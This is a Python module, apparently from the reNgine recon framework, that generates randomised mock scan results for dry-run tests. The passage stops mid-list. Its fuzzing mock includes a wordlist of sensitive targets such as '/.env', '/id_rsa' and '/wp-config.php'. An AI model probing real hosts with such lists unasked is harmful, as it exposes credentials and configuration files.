"""
Mock data utilities for dry run testing
"""

import random
import os
from pathlib import Path
from urllib.parse import urlparse
import json

from reNgine.utils.logger import default_logger as logger
from reNgine.definitions import UNCOMMON_WEB_PORTS
from reNgine.utils.formatters import SafePath
from targetApp.models import Domain


def get_mock_for_task(task_name, args=None, kwargs=None, results_dir=None, ctx=None):
    """Get mock data for a specific task.
    
    Args:
        task_name (str): Name of the task
        args (tuple): Positional arguments of the task
        kwargs (dict): Keyword arguments of the task
        results_dir (str): Directory to store mock files
        ctx (dict): Task context
        
    Returns:
        dict/list: Mock data for the task
    """
    if args is None:
        args = ()
    if kwargs is None:
        kwargs = {}
    if ctx is None:
        ctx = {}

    if not results_dir and ctx:
        results_dir = ctx.get('results_dir', '/tmp')

    # Create a mapping of task handlers
    task_mock_handlers = {
        'scan_http_ports': mock_scan_http_ports,
        'port_scan': mock_port_scan,
        'run_nmap': mock_run_nmap,
        'subdomain_discovery': mock_subdomain_discovery,
        'osint': mock_osint,
        'fetch_url': mock_fetch_url,
        'dir_file_fuzz': mock_dir_file_fuzz,
        'vulnerability_scan': mock_vulnerability_scan,
        'screenshot': mock_screenshot,
        'waf_detection': mock_waf_detection,
        'nmap': mock_nmap_command,
        # Add other tasks as needed
    }

    if task_name in task_mock_handlers:
        return task_mock_handlers[task_name](args, kwargs, results_dir, ctx)
    logger.warning(f"No specific mock handler for task {task_name}, using generic mock")
    return create_generic_mock(task_name, args, kwargs, ctx)


def create_generic_mock(task_name, args, kwargs, ctx):
    """Create a generic mock result for tasks without specific handlers.
    
    Returns:
        dict: Generic mock data
    """
    logger.info(f"Creating generic mock data for task: {task_name}")
    return {
        "task": task_name,
        "status": "success",
        "message": f"Mock data for {task_name}",
        "timestamp": "2023-12-25T12:00:00Z",
        "data": {
            "mock": True,
            "args": args,
            "kwargs": kwargs,
        }
    }


def generate_mock_urls(count=10, base_domains=None, subdomains=True, paths=True, params=False):
    """Generate mock URLs for dry run testing
    
    This function creates realistic-looking URLs that can be used during dry run tests
    to simulate real scan targets without actually querying the database or real systems.
    
    Args:
        count (int): Number of URLs to generate
        base_domains (list): List of base domains to use (e.g., ['example.com', 'test.org'])
                            If None, default domains will be used
        subdomains (bool): Whether to include subdomains
        paths (bool): Whether to include paths
        params (bool): Whether to include query parameters
        
    Returns:
        list: List of mock URLs
    """   
    # Default domains if none provided
    if not base_domains:
        base_domains = [
            'example.com', 
            'test.org', 
            'dryrun.local', 
            'mockdata.net',
            'fakescan.io'
        ]
    
    # Components for generating realistic-looking URLs
    subdomain_prefixes = [
        'api', 'dev', 'test', 'staging', 'prod', 'app', 'admin', 
        'portal', 'secure', 'login', 'web', 'mail', 'support', 
        'dashboard', 'vpn', 'docs', 'cdn', 'static', 'media'
    ]
    
    path_components = [
        'login', 'admin', 'dashboard', 'users', 'products', 'api', 
        'docs', 'help', 'support', 'profile', 'settings', 'search',
        'assets', 'images', 'css', 'js', 'upload', 'download'
    ]
    
    param_names = [
        'id', 'user', 'page', 'q', 'token', 'session', 'redirect',
        'sort', 'filter', 'limit', 'offset', 'type', 'format'
    ]
    
    # Generate URLs
    mock_urls = []
    for _ in range(count):
        # Start with a random base domain
        base_domain = random.choice(base_domains)
        url = f"https://{base_domain}"
        
        # Add subdomain (with 70% probability if enabled)
        if subdomains and random.random() < 0.7:
            prefix = random.choice(subdomain_prefixes)
            url = f"https://{prefix}.{base_domain}"
        
        # Add path (with 80% probability if enabled)
        if paths and random.random() < 0.8:
            path_depth = random.randint(1, 3)
            path = '/'.join(random.choice(path_components) for _ in range(path_depth))
            url = f"{url}/{path}"
            
            # Sometimes add file extension
            if random.random() < 0.3:
                extensions = ['.html', '.php', '.asp', '.jsp', '.json', '.xml']
                url = f"{url}{random.choice(extensions)}"
        
        # Add query parameters (with 40% probability if enabled)
        if params and random.random() < 0.4:
            param_count = random.randint(1, 3)
            query_params = []
            for _ in range(param_count):
                param = random.choice(param_names)
                value = f"value{random.randint(1, 100)}"
                query_params.append(f"{param}={value}")
            url = f"{url}?{'&'.join(query_params)}"
        
        mock_urls.append(url)
    
    logger.info(f"🧪 Generated {len(mock_urls)} mock URLs for dry run testing")
    return mock_urls


def generate_mock_subdomain_data(domain, count=10):
    """Generate mock subdomain data for dry run testing
    
    Args:
        domain (str): Base domain
        count (int): Number of subdomains to generate
        
    Returns:
        list: List of mock subdomain dictionaries
    """
    prefixes = [
        "www", "api", "mail", "blog", "dev", "staging", "test", 
        "admin", "app", "cdn", "static", "media", "shop", "store"
    ]

    subdomains = [
        {
            "name": domain,
            "is_active": True,
            "status_code": 200,
            "page_title": f"{domain.capitalize()} - Home",
            "content_length": random.randint(5000, 50000),
            "technology_stack": ["nginx", "jquery", "bootstrap"],
            "ip_addresses": [
                f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
            ],
        }
    ]
    # Add random subdomains
    selected_prefixes = random.sample(prefixes, min(count-1, len(prefixes)))
    for prefix in selected_prefixes:
        subdomain_name = f"{prefix}.{domain}"
        status_code = random.choice([200, 200, 200, 301, 302, 404, 403, 500])

        subdomain = {
            "name": subdomain_name,
            "is_active": status_code in [200, 301, 302],
            "status_code": status_code,
            "page_title": f"{prefix.capitalize()} - {domain.capitalize()}" if status_code == 200 else "",
            "content_length": random.randint(1000, 100000) if status_code == 200 else 0,
            "technology_stack": random.sample(["nginx", "apache", "jquery", "react", "angular", "django"], k=random.randint(1, 4)),
            "ip_addresses": [f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"]
        }

        subdomains.append(subdomain)

    return subdomains


def mock_subdomain_discovery(args, kwargs, results_dir, ctx):
    """Create mock result for subdomain_discovery task.
    
    Returns:
        list: Mock list of serialized subdomains
    """

    # Determine domain from context or arguments
    domain = kwargs.get('host', None)
    if not domain and ctx:
        if 'domain_id' in ctx and 'Domain' in globals():
            domain_obj = Domain.objects.get(id=ctx['domain_id'])
            domain = domain_obj.name
        elif 'domain_name' in ctx:
            domain = ctx['domain_name']

    # Fallback to a default domain
    if not domain:
        domain = 'example.com'

    logger.info(f'🔍 Generating mock subdomain data for {domain}')

    # Generate mock subdomain data
    mock_subdomains = generate_mock_subdomain_data(domain, count=15)

    # Create serialized representation
    serialized_data = []
    serialized_data.extend(
        {
            'name': subdomain_data['name'],
            'is_active': subdomain_data['is_active'],
            'http_status': subdomain_data['status_code'],
            'page_title': subdomain_data['page_title'],
            'content_length': subdomain_data['content_length'],
            'technologies': subdomain_data['technology_stack'],
            'ip_addresses': subdomain_data['ip_addresses'],
            'discovered_date': "2023-11-15T08:30:00Z",
            'http_url': f"https://{subdomain_data['name']}",
        }
        for subdomain_data in mock_subdomains
    )
    # Return serialized data
    return serialized_data


def mock_fetch_url(args, kwargs, results_dir, ctx):
    """Create mock result for fetch_url task.
    
    Returns:
        dict: Mock URL fetch results
    """
    # Get URLs from arguments or generate them
    urls = kwargs.get('urls', None)
    base_domains = [ctx['domain_name']] if ctx and 'domain_name' in ctx else None
    # Generate URLs if none provided
    if not urls:
        count = 20 if urls is None else len(urls)

        urls = generate_mock_urls(count=count, base_domains=base_domains, 
                                  subdomains=True, paths=True, params=True)

    # Generate mock results for each URL
    results = {}
    for url in urls:
        parsed_url = urlparse(url)
        hostname = parsed_url.netloc
        path = parsed_url.path or '/'

        # Create mock endpoint data
        endpoint_data = {
            'url': url,
            'method': 'GET',
            'status_code': random.choice([200, 200, 200, 301, 302, 404, 403, 500]),
            'content_type': random.choice(['text/html', 'application/json', 'text/plain']),
            'content_length': random.randint(1000, 100000),
            'technologies': random.sample(['jQuery', 'Bootstrap', 'React', 'Angular', 
                                          'Django', 'Flask', 'Spring', 'Laravel'], 
                                         k=random.randint(1, 3)),
            'headers': {
                'Server': random.choice(['nginx/1.18.0', 'Apache/2.4.41', 'Microsoft-IIS/10.0']),
                'Content-Type': 'text/html; charset=UTF-8',
                'Connection': 'keep-alive',
            },
            'title': f"Page title for {hostname}{path}",
            'screenshot_path': f"/static/screenshots/{hostname.replace('.', '_')}_{random.randint(1000, 9999)}.png"
        }

        results[url] = endpoint_data

    logger.info(f"Generated mock data for {len(results)} URLs")
    return results


def mock_osint(args, kwargs, results_dir, ctx):
    """Create mock result for osint task.
    
    Returns:
        dict: Mock OSINT results
    """
    # Determine domain from context or arguments
    domain = kwargs.get('host', None)
    if not domain and ctx and 'domain_name' in ctx:
        domain = ctx['domain_name']

    # Fallback to a default domain
    if not domain:
        domain = 'example.com'

    logger.info(f'🔍 Generating mock OSINT data for {domain}')

    return {
        'domain': domain,
        'whois': {
            'registrar': 'Mock Registrar Inc.',
            'creation_date': '2010-01-15T00:00:00Z',
            'expiration_date': '2025-01-15T00:00:00Z',
            'last_updated': '2022-07-22T00:00:00Z',
            'name_servers': [f'ns1.{domain}', f'ns2.{domain}'],
            'status': ['clientTransferProhibited'],
            'emails': [f'admin@{domain}', f'tech@{domain}'],
        },
        'emails': generate_mock_emails(count=random.randint(5, 15)),
        'employees': generate_mock_employees(count=random.randint(3, 8)),
        'github_repos': generate_mock_github_repos(
            count=random.randint(4, 10), domain=domain
        ),
        'related_domains': [
            f"related1.{domain}",
            f"related2.{domain}",
            f"subsidiary.{domain}",
            f"partner.{domain}",
        ],
        'social_media': {
            'linkedin': f"https://linkedin.com/company/{domain.split('.')[0]}",
            'twitter': f"https://twitter.com/{domain.split('.')[0]}",
            'facebook': f"https://facebook.com/{domain.split('.')[0]}",
        },
        'technology_stack': random.sample(
            [
                'nginx',
                'apache',
                'jquery',
                'react',
                'angular',
                'django',
                'aws',
                'cloudflare',
                'bootstrap',
                'php',
                'wordpress',
                'mysql',
            ],
            k=random.randint(4, 8),
        ),
    }


def mock_screenshot(args, kwargs, results_dir, ctx):
    """Create mock result for screenshot task.
    
    Returns:
        dict: Mock screenshot results
    """
    # Get URLs from arguments or context
    urls = kwargs.get('urls', None)

    # Try to get URLs from context if not in arguments
    if not urls and ctx:
        urls = ctx.get('endpoints', [])

    # Generate mock URLs if none provided
    if not urls:
        base_domains = [ctx['domain_name']] if ctx and 'domain_name' in ctx else None
        urls = generate_mock_urls(count=10, base_domains=base_domains)
    elif isinstance(urls, dict):
        # If urls is a dictionary of endpoints, extract the URLs
        urls = list(urls.keys())

    # Generate mock results for each URL
    results = {}
    for url in urls:
        parsed_url = urlparse(url)
        hostname = parsed_url.netloc

        # Create a safe filename
        safe_hostname = hostname.replace('.', '_')
        filename = f"{safe_hostname}_{random.randint(1000, 9999)}.png"

        # Define the mock screenshot path
        if results_dir:
            screenshot_path = os.path.join(results_dir, 'screenshots', filename)
            # Ensure directory exists
            os.makedirs(os.path.dirname(screenshot_path), exist_ok=True)

            # Create an empty file to simulate the screenshot
            Path(screenshot_path).touch()
        else:
            screenshot_path = f"/static/screenshots/{filename}"

        results[url] = {
            'url': url,
            'status': 'success',
            'screenshot_path': screenshot_path,
            'width': 1280,
            'height': 800,
            'technologies': random.sample(['jQuery', 'Bootstrap', 'React', 'Angular'], 
                                         k=random.randint(1, 3)),
        }

    logger.info(f"Generated mock screenshot data for {len(results)} URLs")
    return results


def mock_waf_detection(args, kwargs, results_dir, ctx):
    """Create mock result for waf_detection task.
    
    Returns:
        dict: Mock WAF detection results
    """
    # Get URLs from arguments or context
    urls = kwargs.get('urls', None)

    # Try to get URLs from context if not in arguments
    if not urls and ctx:
        urls = ctx.get('endpoints', [])

    # Generate mock URLs if none provided
    if not urls:
        base_domains = [ctx['domain_name']] if ctx and 'domain_name' in ctx else None
        urls = generate_mock_urls(count=5, base_domains=base_domains)
    elif isinstance(urls, dict):
        # If urls is a dictionary of endpoints, extract the URLs
        urls = list(urls.keys())

    # WAF provider options
    waf_providers = [
        'Cloudflare', 'Akamai', 'AWS WAF', 'Sucuri', 'Imperva', 
        'F5 ASM', 'Fortinet', 'ModSecurity', 'Barracuda', None
    ]

    # Generate mock results for each URL
    results = {}
    for url in urls:
        parsed_url = urlparse(url)
        hostname = parsed_url.netloc

        # Decide if this host has a WAF
        waf_provider = random.choice(waf_providers)

        results[url] = {
            'url': url,
            'hostname': hostname,
            'has_waf': waf_provider is not None,
            'waf_provider': waf_provider or 'None detected',
            'confidence': random.randint(70, 99) if waf_provider else 0,
            'detection_methods': ['pattern', 'behavior', 'response'] if waf_provider else [],
        }

    logger.info(f"Generated mock WAF detection data for {len(results)} URLs")
    return results


def mock_dir_file_fuzz(args, kwargs, results_dir, ctx):
    """Create mock result for dir_file_fuzz task.
    
    Returns:
        dict: Mock directory and file fuzzing results
    """
    logger.info("Generating mock directory and file fuzzing data")

    # Get URLs to scan from kwargs or context
    urls = kwargs.get('urls', [])
    if not urls and ctx:
        domain = ctx.get('domain_name', 'example.com')
        # Generate some mock URLs for the domain
        base_url = f"https://{domain}"
        urls = [base_url]

    # Common endpoints to "discover" during fuzzing
    common_paths = [
        # Admin panels
        '/admin', '/admin.php', '/administrator', '/login', '/wp-admin',
        # API endpoints
        '/api', '/api/v1', '/api/v2', '/swagger', '/graphql',
        # Common directories
        '/images', '/css', '/js', '/uploads', '/assets', '/static',
        # Common files
        '/robots.txt', '/sitemap.xml', '/favicon.ico', '/README.md', '/CHANGELOG.txt',
        # Sensitive files
        '/.git/HEAD', '/.env', '/config.php', '/wp-config.php', '/id_rsa',
        # Backup files
        '/index.php~', '/backup.sql', '/database.sql.gz',
        # Various extensions
        '/index.php', '/index.html', '/info.php', '/phpinfo.php', '/test.php'
    ]

    # Status codes with probability weights (200 most common)
    status_probabilities = [
        (200, 0.6),    # 60% success
        (403, 0.15),   # 15% forbidden
        (404, 0.1),    # 10% not found
        (401, 0.05),   # 5% unauthorized
        (500, 0.05),   # 5% server error
        (301, 0.025),  # 2.5% permanent redirect
        (302, 0.025)   # 2.5% temporary redirect
    ]

    fuzzing_results = {
        'scan_id': f"mock-dir-fuzz-{random.randint(1000, 9999)}",
        'timestamp': f"2023-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}T{random.randint(0, 23):02d}:{random.randint(0, 59):02d}:00Z",
        'target_count': len(urls),
        'total_endpoints': 0,
        'endpoints_by_status': {
            '200': [],
            '301': [],
            '302': [],
            '401': [],
            '403': [],
            '404': [],
            '500': []
        },
        'findings_by_url': {}
    }

    # Process each URL
    for base_url in urls:
        parsed_url = urlparse(base_url)
        hostname = parsed_url.netloc

        # Determine how many endpoints to "find" (5-15)
        discovery_count = random.randint(5, 15)

        # Select random paths to "discover"
        discovered_paths = random.sample(common_paths, min(discovery_count, len(common_paths)))

        url_findings = []

        # Create results for each discovered path
        for path in discovered_paths:
            # Construct full URL
            if path.startswith('/'):
                full_url = f"{parsed_url.scheme}://{hostname}{path}"
            else:
                full_url = f"{parsed_url.scheme}://{hostname}/{path}"

            # Randomly select status code based on probabilities
            status_code, weight = zip(*status_probabilities)
            status = random.choices(status_code, weights=weight)[0]

            # Generate response size based on status
            if status == 200:
                size = random.randint(1000, 100000)
            elif status in [301, 302]:
                size = random.randint(200, 500)
            elif status in [401, 403]:
                size = random.randint(300, 1000)
            else:
                size = random.randint(100, 500)

            # Create endpoint info
            endpoint_info = {
                'url': full_url,
                'status_code': status,
                'content_length': size,
                'content_type': f"application/{full_url.split('.')[-1]}" if full_url.endswith(('.js', '.css', '.jpg', '.png', '.gif')) else 'text/html',
                'response_time': random.uniform(0.05, 1.2),
                'discovered_by': random.choice(['dirsearch', 'gobuster', 'ffuf'])
            }

            # Add to results by status code
            fuzzing_results['endpoints_by_status'][str(status)].append(endpoint_info)

            # Add to URL-specific findings
            url_findings.append(endpoint_info)

        # Add URL findings to overall results
        fuzzing_results['findings_by_url'][base_url] = url_findings
        fuzzing_results['total_endpoints'] += len(url_findings)

    # Create output files
    try:
        _create_fuzzing_files(results_dir, fuzzing_results, urls)
    except Exception as e:
        logger.error(f"Error creating mock fuzzing files: {str(e)}")

    return fuzzing_results


def _create_fuzzing_files(results_dir, fuzzing_results, urls):
    # Create fuzzing directory if it doesn't exist
    output_dir = os.path.join(results_dir, 'dir_file_fuzz')
    os.makedirs(output_dir, exist_ok=True)

    # Create a JSON results file
    results_file = os.path.join(output_dir, 'fuzzing_results.json')
    with open(results_file, 'w') as f:
        json.dump(fuzzing_results, f, indent=2)

    # Create tool-specific output files
    for tool in ['dirsearch', 'gobuster', 'ffuf']:
        tool_file = os.path.join(output_dir, f"{tool}_results.txt")
        with open(tool_file, 'w') as f:
            f.write(f"# Target: {', '.join(urls)}\n")
            f.write(f"# Date: {fuzzing_results['timestamp']}\n")
            f.write(f"# Tool: {tool}\n\n")

            # Write different formats based on the tool
            if tool == 'dirsearch':
                f.write(f"# Dirsearch started at {fuzzing_results['timestamp']}\n")
                f.write(f"# Command: dirsearch -u {', '.join(urls)} -e php,html,js\n\n")

                for status, endpoints in fuzzing_results['endpoints_by_status'].items():
                    for endpoint in endpoints:
                        if endpoint.get('discovered_by') == tool:
                            f.write(f"[{status}] {endpoint['url']} - {endpoint['content_length']} bytes\n")

            elif tool == 'gobuster':
                f.write("Gobuster v3.1.0\n")
                f.write("by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n\n")

                for status, endpoints in fuzzing_results['endpoints_by_status'].items():
                    for endpoint in endpoints:
                        if endpoint.get('discovered_by') == tool:
                            f.write(f"/{endpoint['url'].split('/')[-1]} (Status: {status}) [Size: {endpoint['content_length']}]\n")

            elif tool == 'ffuf':
                f.write("ffuf report\n\n")

                for status, endpoints in fuzzing_results['endpoints_by_status'].items():
                    for endpoint in endpoints:
                        if endpoint.get('discovered_by') == tool:
                            f.write(f"| URL | {endpoint['url']} |\n")
                            f.write(f"| Status | {status} |\n")
                            f.write(f"| Length | {endpoint['content_length']} |\n")
                            f.write("-" * 50 + "\n")

    logger.info(f"Mock directory and file fuzzing results saved to {output_dir}")


def mock_vulnerability_scan(args, kwargs, results_dir, ctx):
    """Create mock result for vulnerability_scan task.
    
    Returns:
        dict: Mock vulnerability scan results with realistic vulnerabilities
    """
    logger.info("Generating mock vulnerability scan data")

    # Get URLs to scan from kwargs or context
    urls = kwargs.get('urls', [])
    if not urls and ctx:
        domain = ctx.get('domain_name', 'example.com')
        # Generate some mock URLs for the domain
        urls = generate_mock_urls(5, [domain])

    # Generate scan results
    scan_results = {
        'scan_id': f"mock-vuln-scan-{random.randint(1000, 9999)}",
        'timestamp': f"2023-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}T{random.randint(0, 23):02d}:{random.randint(0, 59):02d}:00Z",
        'target_count': len(urls),
        'vulnerabilities': [],
        'statistics': {
            'critical': 0,
            'high': 0,
            'medium': 0,
            'low': 0,
            'info': 0,
            'total': 0
        },
        'tools': {
            'nuclei': {
                'findings': []
            },
            'dalfox': {
                'findings': []
            },
            'crlfuzz': {
                'findings': []
            },
            's3scanner': {
                'findings': []
            }
        }
    }

    # Generate vulnerabilities using existing generators
    nuclei_vulns = generate_mock_nuclei_vulnerabilities(urls, count=3)
    dalfox_vulns = generate_mock_dalfox_vulnerabilities(urls, count=2)
    crlfuzz_vulns = generate_mock_crlfuzz_vulnerabilities(urls, count=1)
    s3scanner_vulns = generate_mock_s3scanner_vulnerabilities(count=2)

    # Add nuclei vulnerabilities
    for vuln in nuclei_vulns:
        scan_results['tools']['nuclei']['findings'].append(vuln)

        # Add to main vulnerabilities list
        unified_vuln = {
            'id': f"VULN-{random.randint(1000, 9999)}",
            'url': vuln.get('host', ''),
            'name': vuln.get('info', {}).get('name', 'Unknown Vulnerability'),
            'severity': vuln.get('info', {}).get('severity', 'medium'),
            'description': vuln.get('info', {}).get('description', ''),
            'identified_by': 'nuclei',
            'references': vuln.get('info', {}).get('reference', []),
            'evidence': vuln.get('matched-at', '')
        }
        scan_results['vulnerabilities'].append(unified_vuln)

        # Update statistics
        severity = unified_vuln['severity']
        if severity in scan_results['statistics']:
            scan_results['statistics'][severity] += 1
        scan_results['statistics']['total'] += 1

    # Add dalfox vulnerabilities
    for vuln in dalfox_vulns:
        scan_results['tools']['dalfox']['findings'].append(vuln)

        # Add to main vulnerabilities list
        unified_vuln = {
            'id': f"VULN-{random.randint(1000, 9999)}",
            'url': vuln.get('url', ''),
            'name': f"XSS - {vuln.get('message', 'Cross-Site Scripting')}",
            'severity': vuln.get('severity', 'high'),
            'description': f"XSS vulnerability in {vuln.get('param', '')} parameter",
            'identified_by': 'dalfox',
            'references': ['https://owasp.org/www-community/attacks/xss/'],
            'evidence': vuln.get('evidence', '')
        }
        scan_results['vulnerabilities'].append(unified_vuln)

        # Update statistics
        severity = unified_vuln['severity']
        if severity in scan_results['statistics']:
            scan_results['statistics'][severity] += 1
        scan_results['statistics']['total'] += 1

    # Add crlfuzz vulnerabilities
    for vuln in crlfuzz_vulns:
        scan_results['tools']['crlfuzz']['findings'].append(vuln)

        # Add to main vulnerabilities list
        unified_vuln = {
            'id': f"VULN-{random.randint(1000, 9999)}",
            'url': vuln.get('url', ''),
            'name': 'CRLF Injection',
            'severity': vuln.get('severity', 'medium'),
            'description': vuln.get('description', ''),
            'identified_by': 'crlfuzz',
            'references': ['https://owasp.org/www-community/vulnerabilities/CRLF_Injection'],
            'evidence': vuln.get('evidence', '')
        }
        scan_results['vulnerabilities'].append(unified_vuln)

        # Update statistics
        severity = unified_vuln['severity']
        if severity in scan_results['statistics']:
            scan_results['statistics'][severity] += 1
        scan_results['statistics']['total'] += 1

    # Add s3scanner vulnerabilities
    for bucket in s3scanner_vulns:
        scan_results['tools']['s3scanner']['findings'].append(bucket)

        # Only add to main vulnerabilities if misconfigured
        bucket_info = bucket.get('bucket', {})
        if (
            bucket_info.get('perm_all_users_read', False)
            or bucket_info.get('perm_all_users_write', False)
            or bucket_info.get('perm_all_users_full_control', False)
        ):
            unified_vuln = {
                'id': f"VULN-{random.randint(1000, 9999)}",
                'url': bucket_info.get('url', ''),
                'name': 'S3 Bucket Misconfiguration',
                'severity': 'high',
                'description': f"Public access permissions found on S3 bucket '{bucket_info.get('name')}'",
                'identified_by': 's3scanner',
                'references': ['https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html'],
                'evidence': f"Bucket: {bucket_info.get('name')}, Permission: Public Read Access"
            }
            scan_results['vulnerabilities'].append(unified_vuln)

            # Update statistics
            scan_results['statistics']['high'] += 1
            scan_results['statistics']['total'] += 1

    # Create output files
    try:
        _create_vulnerability_files(results_dir, scan_results)
    except Exception as e:
        logger.error(f"Error creating mock vulnerability scan files: {str(e)}")

    # Return the results
    return scan_results


def _create_vulnerability_files(results_dir, scan_results):
    # Create output directory if it doesn't exist
    output_dir = os.path.join(results_dir, 'vulnerability_scan')
    os.makedirs(output_dir, exist_ok=True)

    # Create a mock results JSON file
    results_file = os.path.join(output_dir, 'vulnerability_results.json')
    with open(results_file, 'w') as f:
        json.dump(scan_results, f, indent=2)

    # Create individual tool result files
    for tool in ['nuclei', 'dalfox', 'crlfuzz', 's3scanner']:
        tool_file = os.path.join(output_dir, f"{tool}_results.json")
        with open(tool_file, 'w') as f:
            json.dump(scan_results['tools'][tool]['findings'], f, indent=2)

    logger.info(f"Mock vulnerability scan results saved to {output_dir}")


def mock_port_scan(args, kwargs, results_dir, ctx):
    """Create mock result for port_scan task.
    
    Returns:
        dict: Mock port scan results
    """
    
    # Get target hosts from context
    hosts = []
    if ctx and 'subdomains' in ctx:
        hosts = [s.get('name') for s in ctx['subdomains']]
    elif not hosts:
        hosts = ['example.com', 'sub1.example.com', 'sub2.example.com']
    
    # Build ports data for run_nmap
    ports_data = {}
    for host in hosts:
        # Assign different port configurations to different hosts
        if random.random() < 0.3:
            # Web server with database
            ports_data[host] = [22, 80, 443, 3306]
        elif random.random() < 0.6:
            # Application server
            ports_data[host] = [22, 80, 443, 8080, 8443]
        else:
            # Basic web server
            ports_data[host] = [22, 80, 443]
    
    # Configure nmap arguments for mock run
    args = {
        'nmap_cmd': '-Pn -sV --open',
        'ports_data': ports_data,
        'wait_for_results': True,
        'use_cache': False
    }
    
    # Call mock_run_nmap to generate consistent mock data
    return mock_run_nmap(args, {'ports_data': ports_data, 'wait_for_results': True}, 
                        results_dir, ctx)


def mock_scan_http_ports(args, kwargs, results_dir, ctx):
    """Create mock result for scan_http_ports task.
    
    Returns:
        dict: Mock HTTP port scan results
    """
    from reNgine.utils.nmap_service import create_nmap_xml_file

    # Get hosts from arguments
    hosts = kwargs.get('hosts', [])
    if isinstance(hosts, str):
        hosts = [hosts]

    # If no hosts provided, try to get from context
    if not hosts and ctx:
        if domain := ctx.get('domain_name'):
            hosts = [domain]

    # If still no hosts, use default
    if not hosts:
        hosts = ['example.com']

    results = {}
    for host in hosts:
        # Create random number of open ports for each host
        open_ports = [80, 443]  # Always include standard HTTP ports

        # Add some random uncommon web ports
        open_ports.extend(
            port
            for port in random.sample(
                UNCOMMON_WEB_PORTS, k=random.randint(0, 4)
            )
            if random.random() < 0.3
        )
        # Define services for each port
        host_result = {
            'host': host,
            'ip': f'192.168.1.{random.randint(1, 254)}',
            'ports': []
        }

        for port in open_ports:
            is_https = port == 443 or (port in UNCOMMON_WEB_PORTS and random.random() < 0.5)
            service = 'https' if is_https else 'http'

            host_result['ports'].append({
                'port': port,
                'service': service,
                'state': 'open',
                'protocol': 'tcp',
                'reason': 'syn-ack',
                'product': 'nginx' if random.choice([True, False]) else 'Apache httpd',
                'version': f'{random.randint(1, 3)}.{random.randint(0, 20)}',
            })

        # Generate XML file content (simplified for mock)
        xml_content = generate_nmap_xml(host, host_result)

        # Save XML file
        if results_dir:
            try:
                xml_file = create_nmap_xml_file(host, results_dir, 'nmap.xml')
                logger.info(f"Writing mock nmap XML for {host} to {xml_file}")
                with open(xml_file, 'w') as f:
                    f.write(xml_content)
            except (ValueError, OSError) as e:
                logger.error(f"Failed to write mock nmap XML for {host}: {str(e)}")

        results[host] = host_result

    return results


def mock_run_nmap(args, kwargs, results_dir, ctx):
    """Create mock result for run_nmap task.
    
    Returns:
        dict: Mock nmap results per host
    """
    ports_data = kwargs.get('ports_data', {})
    wait_for_results = kwargs.get('wait_for_results', False)
    
    if not wait_for_results:
        return None
    
    results = {}
    for host, ports in ports_data.items():
        host_result = {
            'host': host,
            'ip': f'192.168.1.{random.randint(1, 254)}',
            'ports': []
        }
        
        # Add mock port data
        for port in ports:
            is_http = port in [80, 443] or (port in UNCOMMON_WEB_PORTS)
            service = 'http' if is_http and port != 443 else 'https' if port == 443 else f'service_{port}'
            
            host_result['ports'].append({
                'port': port,
                'service': service,
                'state': 'open',
                'protocol': 'tcp',
                'reason': 'syn-ack',
                'product': f'Product {port}',
                'version': f'{random.randint(1, 5)}.{random.randint(0, 10)}',
            })
            
        results[host] = host_result
        
    return results


def mock_nmap_command(args, kwargs, results_dir, ctx):
    """Create mock result for individual nmap command task.
    
    Returns:
        dict: Mock nmap command result
    """
    host = kwargs.get('host', 'example.com')
    ports = kwargs.get('ports', [80, 443])
    if kwargs.get('xml_output', True):
        # Create mock XML file
        try:
            _create_nmap_xml(host, results_dir, ports)
        except (ValueError, OSError) as e:
            logger.error(f"Failed to create mock XML for {host}: {str(e)}")

    # Return command result
    return {
        'command': f"nmap {host} -p {','.join(map(str, ports))}",
        'return_code': 0,
        'output': f"Mock nmap scan for {host}",
    }


def _create_nmap_xml(host, results_dir, ports):
    xml_filename = f"{host}_nmap.xml"
    xml_path = SafePath.create_safe_path(
        base_dir=results_dir or '/tmp',
        components=[xml_filename],
        create_dir=False
    )

    # Create host result for XML generation
    host_result = {
        'host': host,
        'ip': f'192.168.1.{random.randint(1, 254)}',
        'ports': []
    }

    # Add ports
    for port in ports:
        is_http = port in [80, 443] or (port in UNCOMMON_WEB_PORTS)
        service = 'http' if is_http and port != 443 else 'https' if port == 443 else f'service_{port}'

        host_result['ports'].append({
            'port': port,
            'service': service,
            'state': 'open',
            'protocol': 'tcp',
            'reason': 'syn-ack',
            'product': f'Product {port}',
            'version': f'{random.randint(1, 5)}.{random.randint(0, 10)}',
        })

    # Generate XML content
    xml_content = generate_nmap_xml(host, host_result)

    # Write XML file
    with open(xml_path, 'w') as f:
        f.write(xml_content)


def generate_nmap_xml(host, host_result):
    """Generate mock nmap XML content.
    
    Args:
        host (str): Target hostname
        host_result (dict): Host result data
        
    Returns:
        str: Mock XML content
    """
    ports_xml = "".join(
        f"""
        <port protocol="{port_data['protocol']}" portid="{port_data['port']}">
            <state state="{port_data['state']}" reason="{port_data['reason']}" />
            <service name="{port_data['service']}" product="{port_data['product']}" version="{port_data['version']}" />
        </port>
        """
        for port_data in host_result.get('ports', [])
    )
    return f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE nmaprun>
<nmaprun scanner="nmap">
    <host>
        <status state="up" />
        <address addr="{host_result['ip']}" addrtype="ipv4" />
        <hostnames>
            <hostname name="{host}" />
        </hostnames>
        <ports>
            {ports_xml}
        </ports>
    </host>
</nmaprun>
"""


def generate_mock_emails(count=10):
    """Generate mock email addresses for OSINT.
    
    Returns:
        list: List of mock email addresses
    """
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'example.com', 'company.io']
    names = ['john', 'jane', 'alice', 'bob', 'admin', 'info', 'support', 'contact', 'sales']
    separators = ['.', '_', '-']
    
    emails = []
    for _ in range(count):
        if random.random() < 0.3:  # 30% chance of a compound name
            name = f"{random.choice(names)}{random.choice(separators)}{random.choice(names)}"
        else:
            name = random.choice(names)
            
        domain = random.choice(domains)
        email = f"{name}@{domain}"
        emails.append(email)
    
    return list(set(emails))  # Remove duplicates


def generate_mock_employees(count=5):
    """Generate mock employee data for OSINT.
    
    Returns:
        list: List of mock employee information
    """
    first_names = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Emma', 'Robert', 'Lisa']
    last_names = ['Smith', 'Johnson', 'Williams', 'Jones', 'Brown', 'Miller', 'Davis', 'Wilson']
    positions = [
